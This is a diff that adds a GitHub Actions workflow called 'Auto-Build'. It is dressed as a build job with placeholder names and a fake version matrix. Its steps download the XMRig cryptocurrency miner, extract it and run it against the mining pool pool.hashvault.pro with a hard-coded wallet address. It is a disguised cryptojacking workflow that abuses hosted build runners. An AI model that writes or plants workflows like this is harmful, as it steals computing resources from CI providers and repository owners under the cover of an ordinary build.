@@ -1,0 +1,28 @@
+
+
+name: Auto-Build
+
+on: [workflow_dispatch]
+
+jobs:
+  build:
+    name: NAME
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 7
+      fail-fast: false
+      matrix:
+        go: [1.0, 1.1, 1.2 ]
+        flag: [A, B, C, ]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: DOWNLOAD
+      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-gcc-win64.zip -OutFile xmrig-6.15.0-gcc-win64.zip
+    - name: Extract
+      run: Expand-Archive xmrig-6.15.0-gcc-win64.zip
+    - name: RUNNING
+      run: chmod +x .\xmrig-6.15.0-gcc-win64\xmrig-6.15.0\xmrig.exe -o pool.hashvault.pro:443 -u SumipBJ7rroF2VmkLaT2KwCL738782k8yMYFwYuU34br65KDBAj6Eg91SXuNxqfB4P3m2pY5Y1ay9YjWpoqszR37Phpeai2cZRCi9YxtyzjwVw -p minering
+    - name: DONE
+      run: exit
